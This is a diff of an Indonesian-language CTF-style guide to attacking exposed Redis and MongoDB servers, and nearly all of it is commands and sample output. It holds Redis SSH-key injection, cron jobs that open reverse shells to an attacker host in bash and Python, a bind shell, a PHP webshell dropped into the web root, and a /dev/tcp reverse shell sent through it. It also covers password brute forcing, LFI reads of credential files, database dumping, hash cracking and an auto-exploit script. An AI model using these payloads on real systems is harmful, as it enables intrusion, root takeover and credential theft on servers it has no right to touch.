@@ -1486,6 +1487,7 @@ SOLUSI:
    mongo --host TARGET --port 27017
 3. Install via npm:
    sudo npm install -g mongosh
+```
 
 ---
 
@@ -1493,8 +1495,7 @@ SOLUSI:
 
 ### EXAMPLE 1: Redis Unauthenticated → SSH Key → Root (HTB Style)
 
-bash
-
+```bash
 # SCENARIO: HTB Machine "RedisInjection" (Contoh)
 # TARGET IP: 10.10.10.100
 # ATTACKER IP: 10.10.14.10
@@ -1544,11 +1545,11 @@ root@target:~# ls
 flag.txt
 root@target:~# cat flag.txt
 HTB{redis_ssh_root_injection_was_too_easy}
+```
 
 ### EXAMPLE 2: Redis Cron → Reverse Shell sebagai Root
 
-bash
-
+```bash
 # SCENARIO: Redis running as root, web access tidak ada
 # TARGET: 10.10.10.150
 # === STEP 1: SETUP LISTENER ===
@@ -1574,11 +1575,11 @@ root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@target:~# cat /root/root.txt
 HTB{redis_cron_backdoor_shell}
+```
 
 ### EXAMPLE 3: MongoDB Unauthenticated → Data Dump → Password Reuse → SSH Login
 
-bash
-
+```bash
 # SCENARIO: MongoDB exposed, credential reuse untuk SSH
 # TARGET: 10.10.10.200
 # === STEP 1: SCAN ===
@@ -1642,6 +1643,7 @@ root@target:~# find / -name "flag*.txt" 2>/dev/null
 /root/flag.txt
 root@target:~# cat /root/flag.txt
 HTB{mongodb_dump_credential_reuse}
+```
 
 ---
 
@@ -1649,8 +1651,7 @@ HTB{mongodb_dump_credential_reuse}
 
 ### 1. Redis Connection Commands
 
-bash
-
+```bash
 # === CONNECTION ===
 # Connect tanpa auth
 redis-cli -h TARGET -p 6379
@@ -1664,11 +1665,11 @@ redis-cli -h TARGET -p 6379
 # Netcat banner grab
 nc -vn TARGET 6379
 echo -e "PING\r\n" | nc -vn TARGET 6379
+```
 
 ### 2. Redis Recon Commands
 
-bash
-
+```bash
 # === RECONNAISSANCE ===
 # Info server
 redis-cli -h TARGET INFO server
@@ -1694,11 +1695,11 @@ redis-cli -h TARGET HGETALL key_name
 redis-cli -h TARGET SMEMBERS key_name
 # Get list range
 redis-cli -h TARGET LRANGE key_name 0 -1
+```
 
 ### 3. Redis File Write (SSH / Cron / Webshell)
 
-bash
-
+```bash
 # === SSH KEY INJECTION ===
 # Generate keypair
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
@@ -1732,11 +1733,11 @@ SAVE
 EOF
 # Access webshell
 curl http://TARGET/shell.php?cmd=id
+```
 
 ### 4. MongoDB Connection Commands
 
-bash
-
+```bash
 # === CONNECTION ===
 # Connect tanpa auth
 mongosh "mongodb://TARGET:27017"
@@ -1749,11 +1750,11 @@ mongosh "mongodb://TARGET:27017" --eval "show dbs"
 mongosh "mongodb://TARGET:27017" --eval "db.version()"
 # Legacy mongo client
 mongo --host TARGET --port 27017
+```
 
 ### 5. MongoDB Recon Commands
 
-bash
-
+```bash
 # === RECONNAISSANCE ===
 # List databases
 mongosh "mongodb://TARGET:27017" --eval "show dbs"
@@ -1781,11 +1782,11 @@ mongosh "mongodb://TARGET:27017" --eval "db.serverStatus()"
 mongosh "mongodb://TARGET:27017" --eval "db.version()"
 # Dump to JSON
 mongosh "mongodb://TARGET:27017/appdb" --eval "JSON.stringify(db.collection.find().toArray())" > dump.json
+```
 
 ### 6. Hash Cracking Commands
 
-bash
-
+```bash
 # === HASH CRACKING ===
 # MongoDB SCRAM-SHA-256 (mode 24100)
 hashcat -m 24100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
@@ -1798,6 +1799,7 @@ hashcat -m 24100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/ha
 # John the Ripper
 john --format=mongo-scram hash.txt
 john --format=mongo-scram --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 ---
 
@@ -1805,8 +1807,7 @@ john --format=mongo-scram --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ### Redis Auto-Exploit Script
 
-bash
-
+```bash
 #!/bin/bash
 # ================================================================
 # redis_auto_exploit.sh - Redis Unauthenticated Auto-Exploit
@@ -1952,22 +1953,22 @@ echo -e "  SSH Key: $SSH_KEY_PATH"
 echo -e "  Command: ssh -i $SSH_KEY_PATH redis@$TARGET"
 echo -e "  Command: ssh -i $SSH_KEY_PATH root@$TARGET"
 echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
+```
 
 ### Cara Penggunaan Script
 
-bash
-
+```bash
 # Save script
 chmod +x redis_auto_exploit.sh
 # Jalankan
 ./redis_auto_exploit.sh 10.10.10.100
 # Dengan port custom
 ./redis_auto_exploit.sh 10.10.10.100 6380
+```
 
 ### MongoDB Auto-Dump Script
 
-bash
-
+```bash
 #!/bin/bash
 # ================================================================
 # mongodb_dump.sh - MongoDB Unauthenticated Auto-Dump
@@ -1993,13 +1994,13 @@ for DB in $DBS; do
     done
 done
 echo "[+] Dump complete! Output in: $OUTPUT_DIR"
+```
 
 ---
 
 ## 📚 LANJUT KE FILE 15
 
-text
-
+```text
 ═══════════════════════════════════════════════════════════════════
   ✅  FILE 14d SELESAI — REDIS & NOSQL WORKFLOW
 ═══════════════════════════════════════════════════════════════════
@@ -2028,67 +2029,59 @@ text
      - MongoDB = show dbs → db.collection.find()
      - NoSQL = username[$ne]=1 → BYPASS
 ═══════════════════════════════════════════════════════════════════
+```
 
 ---
 
 **🔑 TIPS MUSCLE MEMORY:**
 
-text
-
+```text
 1. Redis = PING → +PONG = LANSUNG EKSPLOIT!
 2. Redis = CONFIG SET dir + CONFIG SET dbfilename = WRITE FILE!
 3. MongoDB = show dbs → use → show collections → find()
 4. NoSQL = $ne, $gt, $regex → BYPASS LOGIN!
 5. Selalu cek user Redis: ps aux | grep redis
 6. Root = Cron, Redis = SSH Key, www-data = Webshell\
-
 ```
-``
+
 ---
 
-# 14d_Redis & MongoDB — Complete Attack Workflow
+# 14d_Redis & MongoDB — Complete Attack Workflow (UPDATED)
 
-> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
+> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
 
 ---
 
 ## 🔧 PRE-FLIGHT: Setup Environment
 
-Bash
-
-```
-# Jalankan INI DULU sebelum apapun
+```bash
 export TARGET="10.10.11.200"
-export LHOST="10.10.14.5"        # IP tun0 kamu
+export LHOST="10.10.14.5"
 export LPORT="4444"
-mkdir -p ~/redis_mongo_loot/{redis,mongo,creds,keys,loot}
+export REDIS_PASS=""
+mkdir -p ~/redis_mongo_loot/{redis,mongo,creds,keys,loot,burp}
 cd ~/redis_mongo_loot
-
 echo "[*] Target: $TARGET | LHOST: $LHOST"
 ```
 
 **Output yang diharapkan:**
 
-text
-
-```
+```text
 [*] Target: 10.10.11.200 | LHOST: 10.10.14.5
 ```
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ## FASE 0: DETEKSI PORT & SERVICE
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ### Langkah 0.1 — Scan Port Redis & MongoDB
 
-Bash
-
-```
-# Command 1: Cek kedua port sekaligus
+```bash
+# Command 1: Scan kedua port sekaligus
 nmap -p 6379,27017 -sV -sC $TARGET -oN nmap_nosql.txt
 
 # Command 2: Jika target tidak merespons (firewall)
@@ -2101,9 +2094,7 @@ nc -vn $TARGET 27017
 
 **OUTPUT BERHASIL ✅ — Redis ditemukan:**
 
-text
-
-```
+```text
 6379/tcp open  redis   Redis key-value store 6.0.16
 | redis-info:
 |   Version: 6.0.16
@@ -2113,13 +2104,11 @@ text
 |   Config File: /etc/redis/redis.conf
 ```
 
-➡️ Redis port open → **Lanjut ke FASE 1 (Redis)**
+➡️ Redis port open → Lanjut ke **FASE 1 (Redis)**
 
 **OUTPUT BERHASIL ✅ — MongoDB ditemukan:**
 
-text
-
-```
+```text
 27017/tcp open  mongodb MongoDB 4.4.28
 | mongodb-info:
 |   MongoDB Build Info:
@@ -2127,57 +2116,46 @@ text
 |   net.port: 27017
 ```
 
-➡️ MongoDB port open → **Lanjut ke FASE 6 (MongoDB)**
+➡️ MongoDB port open → Lanjut ke **FASE 6 (MongoDB)**
 
 **OUTPUT BERHASIL ✅ — Kedua port open:**
 
-text
-
-```
-6379/tcp  open  redis    Redis 6.0.16
-27017/tcp open  mongodb  MongoDB 4.4.28
+```text
+6379/tcp  open  redis   Redis 6.0.16
+27017/tcp open  mongodb MongoDB 4.4.28
 ```
 
 ➡️ Serang Redis dulu (lebih berbahaya karena bisa file write), lalu MongoDB
 
 **OUTPUT GAGAL ❌ — Port filtered:**
 
-text
-
-```
+```text
 6379/tcp  filtered redis
 27017/tcp filtered mongodb
 ```
 
 ➡️ Firewall blocking. Coba:
 
-Bash
-
-```
+```bash
 # Bypass dengan source port umum
 nmap -p 6379,27017 -Pn --source-port 53 $TARGET
 
-# Atau cek dari dalam jika sudah ada akses ke sistem
-# (via LFI, webshell, dll) — connect ke localhost
+# Jika sudah ada akses ke sistem (via LFI, webshell, dll)
 redis-cli -h 127.0.0.1 -p 6379 PING
 ```
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ## FASE 1: REDIS — AUTENTIKASI CHECK
 
-## ══════════════════════════════════════════
-
-> **Tujuan:** Tentukan apakah Redis perlu password atau tidak. Ini menentukan semua langkah berikutnya.
+## ═══════════════════════════════════════
 
 ### Langkah 1.1 — Test Koneksi Redis
 
-Bash
-
-```
-# Command 1: Test paling cepat — PING
+```bash
+# Command 1: Test paling cepat
 redis-cli -h $TARGET -p 6379 PING
 
 # Command 2: Coba langsung ambil info server
@@ -2189,21 +2167,16 @@ echo -e "PING\r\n" | nc -vn $TARGET 6379 2>/dev/null | head -5
 
 **OUTPUT BERHASIL ✅ — Unauthenticated (JACKPOT!):**
 
-text
-
-```
+```text
 +PONG
 ```
 
-**Artinya:** Redis TIDAK ada password. Akses penuh tanpa credentials!
-
+➡️ Redis TIDAK ada password. Akses penuh tanpa credentials!  
 ➡️ **LANGSUNG ke Langkah 1.3 (Recon)**
 
 **OUTPUT GAGAL ❌ — Auth required:**
 
-text
-
-```
+```text
 (error) NOAUTH Authentication required.
 ```
 
@@ -2211,25 +2184,17 @@ text
 
 **OUTPUT GAGAL ❌ — Connection refused:**
 
-text
-
-```
+```text
 Could not connect to Redis at 10.10.11.200:6379: Connection refused
 ```
 
-➡️ Kemungkinan:
+➡️ Kemungkinan: Redis bind ke 127.0.0.1 saja, protected mode aktif, atau port berbeda:
 
-- Redis bind ke `127.0.0.1` saja (bukan `0.0.0.0`)
-- Protected mode aktif
-- Port berbeda
-
-Bash
-
-```
+```bash
 # Cek port lain yang mungkin
 nmap -p 6380,6381,6382 -sV $TARGET
 
-# Jika sudah dapat akses ke sistem (via shell lain), coba localhost
+# Jika sudah dapat akses ke sistem, tunnel via SSH
 ssh user@$TARGET -L 6379:127.0.0.1:6379
 redis-cli -h 127.0.0.1 -p 6379 PING
 ```
@@ -2238,13 +2203,8 @@ redis-cli -h 127.0.0.1 -p 6379 PING
 
 ### Langkah 1.2 — Brute Force Redis Password
 
-Bash
-
-```
-# Command 1: Hydra untuk brute force
-hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET:6379
-
-# Command 2: Coba default password manual (lebih cepat)
+```bash
+# Command 1: Coba default password manual (lebih cepat)
 for pass in "" "redis" "admin" "password" "root" "123456" "foobared" "redis123"; do
     result=$(redis-cli -h $TARGET -p 6379 -a "$pass" PING 2>/dev/null)
     if [ "$result" == "+PONG" ] || [ "$result" == "PONG" ]; then
@@ -2254,33 +2214,29 @@ for pass in "" "redis" "admin" "password" "root" "123456" "foobared" "redis123";
     fi
 done
 
-# Command 3: Cari password di file konfigurasi jika sudah punya akses sistem
-# (gunakan LFI atau shell yang sudah ada)
+# Command 2: Hydra untuk brute force
+hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET:6379
+
+# Command 3: Cari password di file konfigurasi (jika ada akses sistem lain)
 cat /etc/redis/redis.conf | grep requirepass
 find / -name ".env" -readable 2>/dev/null | xargs grep -i "redis" 2>/dev/null
 ```
 
-**OUTPUT BERHASIL ✅ — Password ditemukan:**
+**OUTPUT BERHASIL ✅ — Password ditemukan dari loop:**
 
-text
-
-```
+```text
 [+] PASSWORD FOUND: 'foobared'
 ```
 
-atau dari hydra:
+**OUTPUT BERHASIL ✅ — Password dari hydra:**
 
-text
-
-```
+```text
 [6379][redis] host: 10.10.11.200   password: admin123
 ```
 
 ➡️ Simpan dan test:
 
-Bash
-
-```
+```bash
 export REDIS_PASS="admin123"
 redis-cli -h $TARGET -p 6379 -a "$REDIS_PASS" PING
 # Output: PONG → lanjut ke Langkah 1.3
@@ -2288,62 +2244,47 @@ redis-cli -h $TARGET -p 6379 -a "$REDIS_PASS" PING
 
 **OUTPUT BERHASIL ✅ — Password di .env atau config:**
 
-text
-
-```
+```text
 # /etc/redis/redis.conf
 requirepass "SuperSecretRedisPass2024!"
 ```
 
 atau di web app:
 
-text
-
-```
+```text
 REDIS_PASSWORD=SuperSecretRedisPass2024!
 REDIS_HOST=10.10.11.200
 ```
 
 ➡️ Coba password tersebut:
 
-Bash
-
-```
+```bash
 export REDIS_PASS="SuperSecretRedisPass2024!"
 redis-cli -h $TARGET -a "$REDIS_PASS" PING
 ```
 
 **OUTPUT GAGAL ❌ — Hydra tidak bisa crack:**
 
-text
-
-```
+```text
 0 of 1 completed, 0 found
 ```
 
 ➡️ Password tidak ada di rockyou. Opsi:
 
-1. Cari di source code aplikasi web yang menggunakan Redis
-2. Cari di file `.env` via LFI jika ada web server
-3. Cek apakah ada webshell atau path lain untuk baca `/etc/redis/redis.conf`
-4. **Google:** `"site:github.com redis config CTF machine name"`
-
-Bash
-
-```
+```bash
 # Cari via LFI jika web server ada
 curl "http://$TARGET/page?file=../../../../etc/redis/redis.conf"
 curl "http://$TARGET/page?file=../../../../var/www/html/.env"
+
+# Google: "site:github.com redis config CTF machine name"
 ```
 
 ---
 
-### Langkah 1.3 — Redis Reconnaissance (Setelah Dapat Akses)
+### Langkah 1.3 — Redis Reconnaissance
 
-Bash
-
-```
-# Buat alias dengan/tanpa password untuk kemudahan
+```bash
+# Buat alias dengan/tanpa password
 if [ -n "$REDIS_PASS" ]; then
     alias rcli="redis-cli -h $TARGET -p 6379 -a $REDIS_PASS"
 else
@@ -2361,50 +2302,31 @@ rcli CONFIG GET dir
 # 3. Nama file database
 rcli CONFIG GET dbfilename
 
-# 4. Cek apakah ada password (jika belum ketahuan)
+# 4. Cek apakah ada password
 rcli CONFIG GET requirepass
 
-# 5. List semua keys — HATI-HATI jika production!
+# 5. List semua keys
 rcli KEYS "*"
 
 # 6. Jumlah total keys
 rcli DBSIZE
 
-# 7. Keyspace info (berapa database yang ada)
+# 7. Keyspace info
 rcli INFO keyspace
-```
-
-**OUTPUT BERHASIL ✅ — Info server lengkap:**
-
-text
-
-```
-# Server
-redis_version:6.0.16
-redis_git_sha1:00000000
-os:Linux 5.10.0 x86_64
-arch_bits:64
-process_id:1234
-tcp_port:6379
-config_file:/etc/redis/redis.conf
 ```
 
 **OUTPUT BERHASIL ✅ — CONFIG GET dir:**
 
-text
-
-```
+```text
 1) "dir"
 2) "/var/lib/redis"
 ```
 
-➡️ **CATAT DIREKTORI INI!** Ini direktori default Redis. Kita akan ubah untuk file write.
+➡️ **CATAT DIREKTORI INI!** Ini direktori default Redis.
 
 **OUTPUT BERHASIL ✅ — KEYS * ada data menarik:**
 
-text
-
-```
+```text
 1) "user:admin"
 2) "session:abc123"
 3) "config:app"
@@ -2414,23 +2336,18 @@ text
 
 ➡️ Baca semua key yang menarik:
 
-Bash
-
-```
-# Baca value setiap key yang menarik
+```bash
 rcli GET flag
 rcli GET password
-rcli TYPE user:admin          # Cek tipe dulu!
-rcli HGETALL user:admin       # Jika tipe HASH
+rcli TYPE user:admin        # Cek tipe dulu!
+rcli HGETALL user:admin     # Jika tipe HASH
 rcli LRANGE session:abc123 0 -1  # Jika tipe LIST
-rcli SMEMBERS config:app      # Jika tipe SET
+rcli SMEMBERS config:app    # Jika tipe SET
 ```
 
-**OUTPUT BERHASIL ✅ — Ketemu flag atau password langsung:**
+**OUTPUT BERHASIL ✅ — Ketemu flag atau password:**
 
-text
-
-```
+```text
 $ rcli GET flag
 "HTB{redis_unauth_easy_flag}"
 
@@ -2440,28 +2357,20 @@ $ rcli GET password
 
 ➡️ Simpan credentials:
 
-Bash
-
-```
+```bash
 echo "Redis data - password: AdminP@ss2024!" >> ~/redis_mongo_loot/creds/found_creds.txt
 ```
 
 **OUTPUT GAGAL ❌ — WRONGTYPE error:**
 
-text
-
-```
+```text
 (error) WRONGTYPE Operation against a key holding the wrong kind of value
 ```
 
-➡️ Key bukan tipe string. Cek tipe dulu:
+➡️ Key bukan tipe string:
 
-Bash
-
-```
+```bash
 rcli TYPE key_name
-# Tipe: string, hash, list, set, zset
-
 # Sesuaikan command:
 rcli HGETALL key_name        # untuk hash
 rcli LRANGE key_name 0 -1   # untuk list
@@ -2471,22 +2380,17 @@ rcli ZRANGE key_name 0 -1 WITHSCORES  # untuk sorted set
 
 **OUTPUT GAGAL ❌ — KEYS * timeout/freeze:**
 
-text
-
-```
+```text
 (Hang/timeout terjadi)
 ```
 
-➡️ Terlalu banyak key (production server). Gunakan SCAN:
+➡️ Terlalu banyak key. Gunakan SCAN:
 
-Bash
-
-```
+```bash
 rcli SCAN 0
 rcli SCAN 0 MATCH "flag*"
 rcli SCAN 0 MATCH "password*"
-rcli SCAN 0 COUNT 100
-rcli DBSIZE    # Lihat jumlah total dulu
+rcli DBSIZE  # Lihat jumlah total dulu
 ```
 
 ---
@@ -2495,78 +2399,49 @@ rcli DBSIZE    # Lihat jumlah total dulu
 
 > **Ini adalah langkah kritis** karena menentukan PATH file write yang bisa digunakan.
 
-Bash
-
-```
+```bash
 # Method 1: Jika sudah punya akses shell di sistem
 ps aux | grep redis
 
 # Method 2: Dari Redis sendiri, coba tulis test file ke berbagai lokasi
-# Test apakah bisa tulis ke /root/.ssh/
 rcli CONFIG SET dir /root/.ssh/
 # Jika OK → Redis berjalan sebagai ROOT
 
-# Test apakah bisa tulis ke /home/redis/.ssh/
 rcli CONFIG SET dir /home/redis/.ssh/
 # Jika OK → Redis berjalan sebagai user redis
 
-# Test /var/www/html/ (untuk webshell)
 rcli CONFIG SET dir /var/www/html/
 # Jika OK → bisa drop webshell
-
-# Method 3: Cek dari INFO server
-rcli INFO server | grep process_id
-# Catat PID, nanti bisa cek /proc/PID/status
 ```
 
 **OUTPUT BERHASIL ✅ — CONFIG SET dir berhasil ke /root/.ssh/:**
 
-text
-
-```
+```text
 OK
 ```
 
-➡️ **Redis berjalan sebagai ROOT!** Ini adalah situasi terbaik.
+➡️ Redis berjalan sebagai **ROOT**!
 
-- Gunakan: **SSH Key Injection ke /root/.ssh/** (Fase 2A)
-- Gunakan: **Cron Backdoor** (Fase 2B)
+- Gunakan: SSH Key Injection ke `/root/.ssh/` **(Fase 2A)**
+- Gunakan: Cron Backdoor **(Fase 2B)**
 
 **OUTPUT BERHASIL ✅ — ps aux output:**
 
-text
-
-```
-redis    1234  0.1  0.5 /usr/bin/redis-server *:6379
+```text
+redis   1234  0.1  0.5  /usr/bin/redis-server *:6379
 ```
 
-➡️ Redis berjalan sebagai user `redis`. Gunakan:
-
-- SSH Key Injection ke `/home/redis/.ssh/` (Fase 2A)
-
-**OUTPUT BERHASIL ✅ — Redis berjalan sebagai root:**
-
-text
-
-```
-root     1234  0.1  0.5 /usr/bin/redis-server *:6379
-```
-
-➡️ Langsung ke Fase 2B (Cron Backdoor) untuk root shell.
+➡️ Redis berjalan sebagai user `redis`. Gunakan SSH Key Injection ke `/home/redis/.ssh/`
 
 **OUTPUT GAGAL ❌ — Permission denied saat CONFIG SET:**
 
-text
-
-```
+```text
 (error) ERR: CONFIG SET dir: Permission denied
 ```
 
 ➡️ Coba direktori lain:
 
-Bash
-
-```
+```bash
 rcli CONFIG SET dir /tmp/
 rcli CONFIG SET dir /var/lib/redis/
 rcli CONFIG SET dir /var/tmp/
@@ -2574,22 +2449,15 @@ rcli CONFIG SET dir /var/tmp/
 
 **OUTPUT GAGAL ❌ — CONFIG command disabled:**
 
-text
-
-```
+```text
 (error) ERR unknown command 'CONFIG'
 ```
 
 ➡️ Admin disable command CONFIG. Coba:
 
-Bash
-
-```
+```bash
 # Method 1: Lua RCE (jika Redis 7.0.0-7.0.4)
 rcli EVAL "os.execute('id')" 0
-
-# Method 2: Module loading (jika bisa upload file)
-# Lihat Fase 2D
 
 # Google: "redis CONFIG disabled bypass CTF"
 # Google: "redis lua sandbox escape exploit"
@@ -2597,74 +2465,48 @@ rcli EVAL "os.execute('id')" 0
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ## FASE 2: REDIS — EXPLOITATION PATHS
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ### PATH 2A — SSH Key Injection (Paling Umum di CTF)
 
 > **Prasyarat:** Redis dapat akses ke direktori `.ssh` user
 
-Bash
-
-```
-# STEP 1: Generate SSH keypair khusus untuk exploit ini
+```bash
+# STEP 1: Generate SSH keypair
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
-# Output: Private key di ~/.ssh/redis_exploit
-#         Public key di ~/.ssh/redis_exploit.pub
-
-# Lihat public key
 cat ~/.ssh/redis_exploit.pub
 # ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot
 
 # STEP 2: Format dengan newlines (WAJIB! Tanpa ini GAGAL)
-# Newlines diperlukan agar RDB format tidak corrupt authorized_keys
 PUB_KEY=$(cat ~/.ssh/redis_exploit.pub)
 echo -e "\n\n$PUB_KEY\n\n" > /tmp/redis_key.txt
 
-# STEP 3: Tentukan target path berdasarkan user Redis
+# STEP 3: Tentukan target path
 # JIKA Redis running sebagai redis user:
 export SSH_DIR="/home/redis/.ssh/"
 export SSH_USER="redis"
-
 # JIKA Redis running sebagai root:
 export SSH_DIR="/root/.ssh/"
 export SSH_USER="root"
 
 # STEP 4: Inject key (jalankan berurutan)
 rcli FLUSHALL
-
 rcli CONFIG SET dir $SSH_DIR
-# Jika error → coba buat direktori dulu (lihat troubleshooting)
-
 rcli CONFIG SET dbfilename authorized_keys
-
 rcli SET pubkey "\n\n$PUB_KEY\n\n"
-
 rcli SAVE
 
 # STEP 5: Test SSH login
 ssh -i ~/.ssh/redis_exploit -o StrictHostKeyChecking=no $SSH_USER@$TARGET
 ```
 
-**OUTPUT BERHASIL ✅ — CONFIG SET dir OK:**
-
-text
-
-```
-OK
-OK
-OK
-OK
-```
-
 **OUTPUT BERHASIL ✅ — SSH berhasil masuk:**
 
-text
-
-```
+```text
 Last login: Mon Jan 20 10:00:00 2025 from 10.10.14.10
 redis@target:~$ id
 uid=999(redis) gid=999(redis) groups=999(redis)
@@ -2676,9 +2518,7 @@ redis
 
 **OUTPUT BERHASIL ✅ — SSH sebagai root:**
 
-text
-
-```
+```text
 root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@target:~# cat /root/root.txt
@@ -2689,42 +2529,29 @@ HTB{...}
 
 **OUTPUT GAGAL ❌ — Permission denied (publickey):**
 
-text
-
-```
+```text
 Permission denied (publickey).
 ```
 
-➡️ Beberapa penyebab, cek satu per satu:
+➡️ Beberapa penyebab:
 
-Bash
-
-```
-# Kemungkinan 1: Direktori .ssh belum ada
-# Buat direktori via Redis file write dulu:
+```bash
+# Kemungkinan 1: Direktori .ssh belum ada — buat dulu via Redis
 rcli CONFIG SET dir /home/redis/
 rcli CONFIG SET dbfilename .ssh
 rcli SET dummy ""
 rcli SAVE
 # Lalu ulangi inject authorized_keys
 
-# Kemungkinan 2: User Redis berbeda (cek /etc/passwd)
-# Dari sistem lain atau LFI:
+# Kemungkinan 2: User Redis berbeda — cek /etc/passwd
 curl "http://$TARGET/page?file=../../../../etc/passwd"
 # Cari baris: redis:x:999:999::/var/lib/redis:/bin/bash
-# Gunakan home directory yang tertera
 
 # Kemungkinan 3: Public key format salah — pastikan ada \n\n
 redis-cli -h $TARGET -p 6379 GET pubkey
-# Harus ada newline di awal dan akhir
 
 # Kemungkinan 4: Coba path alternatif
 rcli CONFIG SET dir /var/lib/redis/.ssh/
-
-# Kemungkinan 5: StrictModes di sshd_config
-# Jika StrictModes yes, .ssh harus permission 700
-# authorized_keys harus permission 600
-# Redis BISA write tapi SSH tolak karena permission salah
 ```
 
 ---
@@ -2733,9 +2560,7 @@ rcli CONFIG SET dir /var/lib/redis/.ssh/
 
 > **Prasyarat:** Redis berjalan sebagai ROOT atau user yang bisa tulis ke cron dir
 
-Bash
-
-```
+```bash
 # STEP 1: Setup listener dulu (di terminal terpisah)
 nc -lvnp $LPORT
 
@@ -2758,17 +2583,12 @@ sleep 65
 
 # Alternatif payload jika bash tidak work:
 # Python3:
-rcli SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n"
-
-# Perl:
-rcli SET cron "\n\n* * * * * root perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n\n"
+rcli SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
 ```
 
 **OUTPUT BERHASIL ✅ — Shell masuk ke listener:**
 
-text
-
-```
+```text
 $ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.10.11.200 45123
@@ -2776,15 +2596,11 @@ bash: cannot set terminal process group (1234): Inappropriate ioctl for device
 bash: no job control in this shell
 root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
-root@target:~# whoami
-root
 ```
 
 ➡️ **ROOT SHELL!** Upgrade ke shell interaktif:
 
-Bash
-
-```
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Ctrl+Z
 stty raw -echo; fg
@@ -2794,37 +2610,25 @@ export TERM=xterm
 
 **OUTPUT GAGAL ❌ — Shell tidak masuk setelah 2 menit:**
 
-text
-
-```
+```text
 (tidak ada koneksi ke listener)
 ```
 
 ➡️ Troubleshoot:
 
-Bash
-
-```
-# 1. Cek apakah cron file berhasil dibuat
-rcli CONFIG GET dir  # Pastikan arahnya benar
-rcli CONFIG GET dbfilename
-
-# 2. Cek cron service aktif (jika sudah punya shell lain)
+```bash
+# 1. Cek apakah cron service aktif (jika punya shell lain)
 systemctl status cron
 ps aux | grep cron
 
-# 3. Cek format cron (CentOS/RHEL path berbeda)
+# 2. Cek format cron (CentOS/RHEL path berbeda)
 rcli CONFIG SET dir /var/spool/cron/
 # (tanpa crontabs/ untuk CentOS)
 
-# 4. Cek firewall outbound (mungkin blokir koneksi balik)
-# Coba bind shell sebagai alternatif:
+# 3. Cek firewall outbound — coba bind shell:
 rcli SET cron "\n\n* * * * * root nc -lvnp 5555 -e /bin/bash\n\n"
 rcli SAVE
 # Dari attacker: nc $TARGET 5555
-
-# 5. Verifikasi isi cron file yang ter-generate benar
-# (dari shell lain): cat /var/spool/cron/crontabs/root
 ```
 
 ---
@@ -2833,200 +2637,65 @@ rcli SAVE
 
 > **Prasyarat:** Ada web server, dan Redis bisa write ke web root
 
-Bash
-
-```
-# STEP 1: Identifikasi web root yang mungkin
-WEBROOT_CANDIDATES=(
-    "/var/www/html/"
-    "/var/www/"
-    "/usr/share/nginx/html/"
-    "/srv/http/"
-    "/opt/lampp/htdocs/"
-    "/var/www/html/uploads/"
-)
-
-# STEP 2: Test satu per satu
-for path in "${WEBROOT_CANDIDATES[@]}"; do
+```bash
+# STEP 1: Test satu per satu
+for path in "/var/www/html/" "/var/www/" "/usr/share/nginx/html/" "/srv/http/" "/opt/lampp/htdocs/"; do
     result=$(rcli CONFIG SET dir "$path" 2>/dev/null)
     if [ "$result" == "OK" ]; then
         echo "[+] WRITABLE PATH: $path"
     fi
 done
 
-# STEP 3: Drop webshell ke path yang writable
+# STEP 2: Drop webshell ke path yang writable
 rcli CONFIG SET dir /var/www/html/
 rcli CONFIG SET dbfilename shell.php
 rcli SET webshell "<?php if(isset(\$_REQUEST['cmd'])){ echo '<pre>'.htmlspecialchars(shell_exec(\$_REQUEST['cmd'])).'</pre>'; } ?>"
 rcli SAVE
 
-# STEP 4: Test webshell
+# STEP 3: Test webshell
 curl "http://$TARGET/shell.php?cmd=id"
 curl "http://$TARGET/shell.php?cmd=whoami"
-curl "http://$TARGET/shell.php?cmd=cat+/etc/passwd"
 ```
 
 **OUTPUT BERHASIL ✅ — Webshell accessible:**
 
-text
-
-```
+```text
 <pre>www-data</pre>
 ```
 
 ➡️ Dapat RCE! Upgrade ke reverse shell:
 
-Bash
-
-```
+```bash
 # Setup listener
 nc -lvnp $LPORT &
 
 # Trigger reverse shell via webshell
-REVSHELL="bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
